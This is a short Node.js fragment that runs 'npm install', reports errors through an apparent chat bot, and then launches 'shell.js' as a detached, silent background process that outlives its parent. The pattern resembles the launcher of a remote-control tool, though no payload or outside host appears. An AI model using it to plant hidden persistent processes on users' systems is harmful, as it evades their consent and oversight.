const spawn = require('child_process').spawn;
const { exec } = require("child_process");

exec('npm install', (error, stdout, stderr) => {
    if (error) {
        bot.sendMessage(chatId, `error: ${error.message}`);
        return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `stderr: ${stderr}`);
        return;
    }
    
    const child = spawn(process.argv[0], ['shell.js'], {
    detached: true,
    stdio: ['ignore']
    });
      
    child.unref();
});